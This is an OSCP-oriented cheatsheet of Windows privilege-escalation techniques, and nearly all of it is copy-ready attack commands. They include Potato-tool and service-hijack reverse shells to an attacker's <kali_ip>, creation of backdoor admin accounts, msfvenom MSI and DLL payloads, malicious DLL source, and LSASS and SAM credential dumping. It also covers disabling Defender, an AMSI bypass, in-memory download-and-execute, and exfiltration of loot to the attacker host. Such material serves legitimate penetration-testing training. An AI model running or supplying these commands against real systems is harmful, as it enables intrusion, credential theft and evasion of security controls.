# 🪟 Windows Privilege Escalation Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> Covers all common Windows privesc vectors from low-priv shell to SYSTEM.

---

## 📋 Table of Contents
- [Initial Enumeration](#-initial-enumeration)
- [Token Privileges](#-token-privileges)
- [Potato Attacks](#-potato-attacks)
- [Service Exploitation](#-service-exploitation)
- [Registry Attacks](#-registry-attacks)
- [Scheduled Tasks](#-scheduled-tasks)
- [Stored Credentials](#-stored-credentials)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [DLL Hijacking](#-dll-hijacking)
- [Kernel Exploits](#-kernel-exploits)
- [AV Bypass](#-av-bypass)
- [File Transfers](#-file-transfers)
- [Constrained Language Mode Bypass](#-constrained-language-mode-bypass)
- [Automated Tools](#-automated-tools)
- [Quick Decision Guide](#-quick-decision-guide)
- [Privesc Checklist](#-privesc-checklist)

---

## 🔍 Initial Enumeration

### First Commands After Getting Shell
```powershell
# Who are you?
whoami
whoami /all
whoami /priv
whoami /groups

# System info
systeminfo
systeminfo | findstr /i "os name\|os version\|hotfix\|domain"

# Network info
ipconfig /all
netstat -ano
route print

# Users and groups
net user
net user <username>
net localgroup
net localgroup Administrators

# Running processes
tasklist /v
Get-Process

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion
wmic product get name,version
```

### Environment
```powershell
# PowerShell version
$PSVersionTable

# Language mode (check for CLM)
$ExecutionContext.SessionState.LanguageMode

# Environment variables
Get-ChildItem Env:
echo %PATH%

# Current directory and drives
Get-PSDrive
ls C:\
```

### Network Enumeration
```powershell
# Open ports
netstat -ano

# Firewall rules
netsh advfirewall firewall show rule name=all
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}

# ARP table (find other hosts)
arp -a

# DNS cache
ipconfig /displaydns
```

---

## 🎫 Token Privileges

> **Always check `whoami /priv` first — this is the fastest privesc path.**

```powershell
whoami /priv
```

### Privilege Reference Table

| Privilege | Impact | Attack |
|-----------|--------|--------|
| `SeImpersonatePrivilege` | SYSTEM | Potato attacks |
| `SeAssignPrimaryTokenPrivilege` | SYSTEM | Potato attacks |
| `SeBackupPrivilege` | Read any file | Read SAM/NTDS/shadow |
| `SeRestorePrivilege` | Write any file | Write to system dirs |
| `SeDebugPrivilege` | Debug processes | Dump LSASS |
| `SeLoadDriverPrivilege` | Load kernel driver | Load malicious driver |
| `SeTakeOwnershipPrivilege` | Own any object | Take ownership of files |
| `SeManageVolumePrivilege` | Manage volumes | Access shadow copies |
| `SeCreateSymbolicLinkPrivilege` | Create symlinks | Symlink attacks |

### SeBackupPrivilege — Read Any File
```powershell
# Read SAM and SYSTEM (get local hashes)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Download to Kali and dump
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local

# Read any file
robocopy /b C:\Windows\System32\config\ C:\Windows\Temp\ SAM SYSTEM SECURITY
```

### SeDebugPrivilege — Dump LSASS
```powershell
# Dump LSASS process
Get-Process lsass
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Parse on Kali
pypykatz lsa minidump lsass.dmp
```

---

## 🥔 Potato Attacks

> Required: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`  
> Common when running as: IIS, MSSQL service, network service accounts

### Check if Vulnerable
```powershell
whoami /priv | findstr /i "SeImpersonate\|SeAssignPrimaryToken"
```

### GodPotato (Most Reliable — Windows 10/Server 2019/2022)
```powershell
# Download
iwr http://<kali_ip>/GodPotato.exe -OutFile C:\Windows\Temp\GodPotato.exe

# Test with whoami
.\GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell
.\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"

# Add admin user
.\GodPotato.exe -cmd "cmd /c net user pwned Password123! /add && net localgroup Administrators pwned /add"
```

### PrintSpoofer (Windows 10/Server 2019)
```powershell
# Download
iwr http://<kali_ip>/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe

# Interactive shell (needs interactive session)
.\ps.exe -i -c cmd

# Reverse shell (use in non-interactive shells)
.\ps.exe -c "C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"

# Confirm execution
.\ps.exe -c "cmd /c whoami > C:\Windows\Temp\out.txt"
type C:\Windows\Temp\out.txt
```

### SweetPotato
```powershell
# Download
iwr http://<kali_ip>/SweetPotato.exe -OutFile C:\Windows\Temp\sp.exe

# Execute
.\sp.exe -e EfsRpc -p C:\Windows\Temp\nc.exe -a "<kali_ip> 9001 -e cmd"

# Alternative trigger
.\sp.exe -e PrintSpoofer -p C:\Windows\Temp\nc.exe -a "<kali_ip> 9001 -e cmd"
```

### JuicyPotato (Older Systems — Server 2016/Windows 10 pre-1809)
```powershell
# Download
iwr http://<kali_ip>/JuicyPotato.exe -OutFile C:\Windows\Temp\jp.exe

# Needs CLSID for target OS — check https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\jp.exe -l 9001 -p C:\Windows\Temp\nc.exe -a "<kali_ip> 9001 -e cmd.exe" -t * -c {CLSID}
```

> 💡 **Tip:** If PrintSpoofer fails in non-interactive shell use `-c` not `-i`. GodPotato is the most reliable across modern Windows versions.

---

## ⚙️ Service Exploitation

### Find Vulnerable Services
```powershell
# Unquoted service paths (most common)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows\\" | findstr /v '"""'

# Check service permissions
.\accesschk.exe -uwcqv "Everyone" * /accepteula
.\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
.\accesschk.exe -uwcqv "<yourusername>" * /accepteula

# Services running as SYSTEM with weak binary permissions
Get-WmiObject win32_service | Select Name,State,StartName,PathName | Where-Object {$_.StartName -like "*system*"}

# Check binary permissions
icacls "C:\path\to\service.exe"
```

### Unquoted Service Path
```powershell
# If service path is: C:\Program Files\My Service\service.exe
# Windows tries: C:\Program.exe, C:\Program Files\My.exe, C:\Program Files\My Service\service.exe

# Place malicious binary in exploitable location
# Example: copy nc.exe to C:\Program.exe
copy C:\Windows\Temp\nc.exe "C:\Program.exe"

# Restart service
sc stop <service_name>
sc start <service_name>

# Or wait for reboot if no restart rights
shutdown /r /t 0
```

### Weak Service Binary Permissions
```powershell
# Check if you can write to service binary
icacls "C:\path\to\service.exe"

# Replace binary with malicious one
copy C:\Windows\Temp\nc.exe "C:\path\to\service.exe"

# Restart service
sc stop <service_name>
sc start <service_name>
```

### Weak Service Permissions (Modify service config)
```powershell
# Check service permissions
.\accesschk.exe -uwcqv <service_name> /accepteula

# If you have SERVICE_CHANGE_CONFIG
sc config <service_name> binpath= "C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"
sc stop <service_name>
sc start <service_name>

# Or add admin user
sc config <service_name> binpath= "cmd /c net user pwned Password123! /add && net localgroup Administrators pwned /add"
sc stop <service_name>
sc start <service_name>
```

---

## 📝 Registry Attacks

### AutoRun Registry Keys
```powershell
# Check autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on autorun binary
icacls "<path_from_autorun>"

# If writable — replace with malicious binary
copy C:\Windows\Temp\nc.exe "<path_from_autorun>"
```

### Passwords in Registry
```powershell
# Search for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Putty credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

---

## ⏰ Scheduled Tasks

```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v

# Filter for non-Microsoft tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,TaskPath,State

# Check task details
schtasks /query /fo LIST /v /tn "<task_name>"

# Check if task binary is writable
icacls "<task_binary_path>"

# Check task run frequency
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|schedule\|next run"
```

### Exploit Writable Task Binary
```powershell
# If task binary is writable
copy C:\Windows\Temp\nc.exe "<task_binary_path>"

# Start listener
# nc -lvnp 9001

# Wait for task to run or trigger manually
schtasks /run /tn "<task_name>"
```

### Create New Scheduled Task (if you have rights)
```powershell
# Create task running as SYSTEM
schtasks /create /sc onstart /tn "WindowsUpdate" /ru SYSTEM /tr "C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"
schtasks /run /tn "WindowsUpdate"
```

---

## 🔐 Stored Credentials

### Windows Credential Manager
```powershell
# List stored credentials
cmdkey /list

# Use stored creds with runas
runas /savecred /user:<username> "C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"
```

### Search for Passwords in Files
```powershell
# Search common locations
dir /s /b *pass* *cred* *secret* *config* 2>nul
dir /s /b *.config *.conf *.ini *.txt 2>nul | findstr /i "pass\|cred\|secret"

# PowerShell recursive search
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select Path,LineNumber,Line

# Check common files
type C:\Windows\System32\drivers\etc\hosts
type C:\inetpub\wwwroot\web.config
type C:\xampp\passwords.txt
type C:\xampp\phpMyAdmin\config.inc.php
type C:\wamp\apps\phpmyadmin*\config.inc.php
```

### PowerShell History
```powershell
# Check PowerShell history (goldmine for creds)
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All users history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
```

### Unattended Installation Files
```powershell
# Check for unattended install files (contain admin passwords)
type C:\Windows\sysprep\sysprep.xml
type C:\Windows\sysprep\sysprep.inf
type C:\Windows\sysprep.inf
type C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend\Unattended.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
```

---

## 📦 AlwaysInstallElevated

> If both registry keys are set to 1, you can install MSI packages as SYSTEM.

```powershell
# Check both keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploit (Both must return 0x1)
```bash
# Create malicious MSI on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=9001 -f msi -o malicious.msi

# Or add admin user
msfvenom -p windows/adduser USER=pwned PASS=Password123! -f msi -o adduser.msi
```

```powershell
# Transfer and install on target
iwr http://<kali_ip>/malicious.msi -OutFile C:\Windows\Temp\malicious.msi

# Start listener on Kali
# nc -lvnp 9001

# Install as elevated
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

## 🔌 DLL Hijacking

### Find Missing DLLs
```powershell
# Use Procmon (Sysinternals) to find DLL not found errors
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Check DLL search order paths
echo %PATH%

# Find writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    $acl = icacls $_ 2>$null
    if ($acl -match "Everyone|BUILTIN\\Users|Authenticated") {
        Write-Host "Writable: $_"
    }
}
```

### Create Malicious DLL
```bash
# On Kali — create DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=9001 -f dll -o malicious.dll

# Or custom DLL (no AV)
cat > shell.c << 'EOF'
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("C:\\Windows\\Temp\\nc.exe <kali_ip> 9001 -e cmd.exe");
    }
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o malicious.dll shell.c
```

```powershell
# Place DLL in writable PATH directory
copy C:\Windows\Temp\malicious.dll "C:\writable\path\missing.dll"

# Restart service or wait for application to load DLL
```

---

## 💥 Kernel Exploits

> Use as last resort — can crash the system.

```powershell
# Get OS version and patches
systeminfo
systeminfo | findstr /i "os\|hotfix"
wmic qfe list brief

# Get missing patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Common Kernel Exploits

| CVE | Name | Affected OS |
|-----|------|-------------|
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Windows 10 2004+ |
| CVE-2021-1675 | PrintNightmare | Windows 7-10, Server 2008-2019 |
| CVE-2020-0796 | SMBGhost | Windows 10 1903/1909 |
| CVE-2019-0708 | BlueKeep | Windows 7, Server 2008 |
| CVE-2017-0144 | EternalBlue | Windows 7, Server 2008 |
| CVE-2016-3225 | MS16-075 | Windows 7-10 |
| CVE-2015-1701 | MS15-051 | Windows 7 |

```bash
# Search for exploits
searchsploit <OS version>
searchsploit windows privilege escalation

# Windows Exploit Suggester
python3 windows-exploit-suggester.py --systeminfo sysinfo.txt --database database.xlsx
```

### HiveNightmare (CVE-2021-36934)
```powershell
# Check if vulnerable
icacls C:\Windows\System32\config\SAM

# If BUILTIN\Users has RX — vulnerable
# Extract hives as low priv user
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

### PrintNightmare (CVE-2021-1675)
```bash
# Check if spooler is running (on target)
Get-Service -Name Spooler

# Exploit from Kali
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<ip> '\\<kali_ip>\share\malicious.dll'
```

---

## 🛡️ AV Bypass

### Disable Windows Defender
```powershell
# Requires admin/SYSTEM
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableAntiSpyware $true

# Add exclusion path
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionPath "C:\Users\Public"

# Check Defender status
Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled
Get-MpThreatDetection
```

### AMSI Bypass
```powershell
# Run before any malicious PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### Run Tools from Memory
```powershell
# Never touch disk
IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/tool.ps1')

# Or
$data = (New-Object Net.WebClient).DownloadData('http://<kali_ip>/tool.exe')
$asm = [System.Reflection.Assembly]::Load($data)
```

### Rename Binaries
```powershell
# Download with innocent name
iwr http://<kali_ip>/mimikatz.exe -OutFile C:\Windows\Temp\svchost32.exe
iwr http://<kali_ip>/winpeas.exe -OutFile C:\Windows\Temp\update.exe
```

### Base64 Transfer (Bypass Network Signatures)
```bash
# On Kali
base64 -w 0 tool.exe > tool.b64
python3 -m http.server 80
```
```powershell
# On target
$b = (iwr http://<kali_ip>/tool.b64 -UseBasicParsing).Content
[IO.File]::WriteAllBytes("C:\Windows\Temp\tool.exe",[Convert]::FromBase64String($b))
```

---

## 📁 File Transfers

### Download to Target
```powershell
# iwr (PowerShell) — most common
$ProgressPreference = 'SilentlyContinue'
iwr http://<kali_ip>/file.exe -OutFile C:\Windows\Temp\file.exe

# certutil — reliable alternative
certutil -urlcache -split -f http://<kali_ip>/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job http://<kali_ip>/file.exe C:\Windows\Temp\file.exe

# SMB (when HTTP is blocked)
# On Kali: impacket-smbserver share . -smb2support -user kali -password kali
net use \\<kali_ip>\share kali /user:kali
copy \\<kali_ip>\share\file.exe C:\Windows\Temp\file.exe
```

### Upload from Target
```powershell
# SMB (most reliable)
# On Kali: impacket-smbserver share . -smb2support -user kali -password kali
net use \\<kali_ip>\share kali /user:kali
copy C:\Windows\Temp\loot.txt \\<kali_ip>\share\loot.txt

# PowerShell upload
$ProgressPreference = 'SilentlyContinue'
iwr -Uri http://<kali_ip>/upload -Method Post -InFile C:\Windows\Temp\loot.txt

# nc.exe transfer
cmd /c "C:\Windows\Temp\nc.exe <kali_ip> 9002 < C:\Windows\Temp\loot.txt"

# Base64 encode and copy paste
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\loot.txt'))
```

---

## 🔒 Constrained Language Mode Bypass

```powershell
# Check if CLM is active
$ExecutionContext.SessionState.LanguageMode
# Returns: ConstrainedLanguage

# Bypass Option 1 — PowerShell v2 downgrade
powershell -version 2 -command "Get-WmiObject win32_service"

# Bypass Option 2 — Use cmd.exe instead
cmd.exe
wmic service get name,pathname,startmode
sc query

# Bypass Option 3 — PSByPassCLM
# https://github.com/padovah4ck/PSByPassCLM

# Bypass Option 4 — Use .NET directly
[System.Environment]::OSVersion.Version
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Bypass Option 5 — Use compiled executables instead of PS scripts
# Tools like SharpUp, Seatbelt work even in CLM
```

---

## 🤖 Automated Tools

### WinPEAS
```powershell
# Download and run
$ProgressPreference = 'SilentlyContinue'
iwr http://<kali_ip>/winpeas.exe -OutFile C:\Windows\Temp\wp.exe
.\wp.exe

# Run from memory (bypass AV)
IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/winPEASx64.ps1')

# Specific checks only
.\wp.exe systeminfo
.\wp.exe servicesinfo
.\wp.exe applicationsinfo
```

### Seatbelt
```powershell
# Download and run all checks
iwr http://<kali_ip>/Seatbelt.exe -OutFile C:\Windows\Temp\sb.exe
.\sb.exe -group=all

# Specific checks
.\sb.exe TokenPrivileges
.\sb.exe CredEnum
.\sb.exe WindowsCredentialFiles
.\sb.exe PowerShellHistory
.\sb.exe AutoRuns
.\sb.exe Services
.\sb.exe ScheduledTasks

# Save output
.\sb.exe -group=all > C:\Windows\Temp\seatbelt_out.txt
type C:\Windows\Temp\seatbelt_out.txt
```

### SharpUp
```powershell
# Check for privesc vectors
iwr http://<kali_ip>/SharpUp.exe -OutFile C:\Windows\Temp\su.exe
.\su.exe audit

# Specific checks
.\su.exe audit ModifiableServices
.\su.exe audit UnquotedServicePath
.\su.exe audit AlwaysInstallElevated
```

### PowerUp (PowerShell — may get flagged)
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/PowerUp.ps1')
Invoke-AllChecks
```

---

## 🗺️ Quick Decision Guide

| Situation | Attack Path |
|-----------|------------|
| `SeImpersonatePrivilege` | GodPotato → SYSTEM |
| `SeBackupPrivilege` | Dump SAM/SYSTEM/SECURITY → crack hashes |
| `SeDebugPrivilege` | Dump LSASS → extract creds |
| Unquoted service path | Place malicious binary → restart service |
| Writable service binary | Replace binary → restart service |
| Weak service permissions | sc config binpath → restart service |
| AlwaysInstallElevated = 1 | Malicious MSI → SYSTEM |
| Writable autorun binary | Replace binary → wait for reboot |
| Stored credentials (cmdkey) | runas /savecred |
| Password in registry | Use creds for lateral movement |
| PowerShell history | Check for cleartext creds |
| Unattended install files | Check for admin password |
| CLM enabled | Use cmd.exe or compiled tools |
| AV blocking tools | Disable Defender + AMSI bypass |
| Nothing found | Kernel exploit (last resort) |

---

## 📋 Privesc Checklist

```
IMMEDIATE CHECKS (run first):
[ ] whoami /priv          → check token privileges
[ ] whoami /all           → groups + privileges
[ ] sudo -l equivalent    → net localgroup Administrators

CREDENTIAL HUNTING:
[ ] cmdkey /list          → stored credentials
[ ] PowerShell history    → ConsoleHost_history.txt
[ ] Registry passwords    → reg query HKLM /f password /t REG_SZ /s
[ ] Autologon creds       → Winlogon registry key
[ ] Unattended files      → sysprep.xml, Unattended.xml
[ ] Config files          → web.config, config.inc.php
[ ] Files with "pass"     → dir /s /b *pass*

SERVICE EXPLOITATION:
[ ] Unquoted service paths   → wmic service get pathname
[ ] Writable service binary  → icacls on each service binary
[ ] Weak service permissions → accesschk.exe
[ ] Services running as SYSTEM with weak config

REGISTRY:
[ ] AlwaysInstallElevated → both HKCU and HKLM keys
[ ] Autorun entries       → check binary permissions
[ ] Passwords in registry → reg query search

SCHEDULED TASKS:
[ ] Non-Microsoft tasks   → Get-ScheduledTask
[ ] Writable task binary  → icacls
[ ] Task running as SYSTEM

DLL HIJACKING:
[ ] Writable PATH dirs    → icacls each PATH entry
[ ] Missing DLLs          → Procmon or manual check

AUTOMATED TOOLS:
[ ] WinPEAS               → full automated enum
[ ] Seatbelt              → targeted checks
[ ] SharpUp               → service/registry checks

LAST RESORT:
[ ] Kernel exploits       → check OS version + missing patches
[ ] HiveNightmare         → check SAM permissions
[ ] PrintNightmare        → check spooler service
```

---

## 💡 Pro Tips

- **Always run `whoami /priv` first** — SeImpersonatePrivilege is instant SYSTEM
- **GodPotato over PrintSpoofer** — more reliable on modern Windows
- **Rename tools before uploading** — Defender flags by filename too
- **Disable Defender before downloading tools** if you have admin already
- **Check PowerShell history** — admins often type passwords in plain text
- **Unquoted service paths** are extremely common in OSCP labs
- **`cmdkey /list`** with `runas /savecred` is a very quick win if present
- **CLM enabled** → switch to cmd.exe or use compiled .exe tools instead of PS scripts
- **Always check** `C:\Program Files\`, `C:\Program Files (x86)\`, and custom app dirs for weak permissions
- **Service account shells** → almost always have SeImpersonatePrivilege → Potato attack

---

## ⚠️ OSCP Exam Notes

| Tool | Allowed? |
|------|---------|
| WinPEAS | ✅ Yes |
| Seatbelt | ✅ Yes |
| SharpUp | ✅ Yes |
| PowerUp | ✅ Yes |
| GodPotato | ✅ Yes |
| PrintSpoofer | ✅ Yes |
| Metasploit (1 machine) | ⚠️ Limited |
| Automated exploit frameworks | ❌ No |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

*Generated for OSCP PEN-200 exam preparation*
